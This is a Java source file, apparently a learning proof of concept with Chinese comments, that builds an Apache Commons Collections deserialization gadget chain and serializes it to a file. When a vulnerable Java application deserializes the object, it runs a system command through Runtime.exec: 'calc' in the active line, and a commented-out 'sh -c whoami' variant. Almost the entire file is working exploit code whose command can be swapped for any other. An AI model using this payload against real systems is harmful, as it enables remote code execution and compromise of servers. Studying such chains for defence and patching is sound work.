package TSBBB;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;



public class ss{
    public static void main(String[] args) throws Exception {
        //execArgs: 待执行的命令数组
        //String[] execArgs = new String[] { "sh", "-c", "whoami &gt; /tmp/fuck" };

        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                /*
                由于Method类的invoke(Object obj,Object args[])方法的定义
                所以在反射内写new Class[] {Object.class, Object[].class }
                正常POC流程举例：
                ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
                */
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class,Object[].class },
                        new Object[] {null, null }
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String[].class },
                        new Object[] { "calc" }
                        //new Object[] { execArgs }
                )
        };

        //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
        Transformer transformedChain = new ChainedTransformer(transformers);

        //BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict
        //Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();
        Map<String,String> BeforeTransformerMap = new HashMap<String,String>();

        BeforeTransformerMap.put("hello", "hello");

        //Map数据结构，转换后的Map
       /*
       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
            第一个参数为待转化的Map对象
            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
            第三个参数为Map对象内的value要经过的转化方法。
       */
        //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);
        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);

        File f = new File("temp.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
    }
}

/*
思路:构建BeforeTransformerMap的键值对，为其赋值，
     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme
     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行

     执行本质: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)
     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()

*/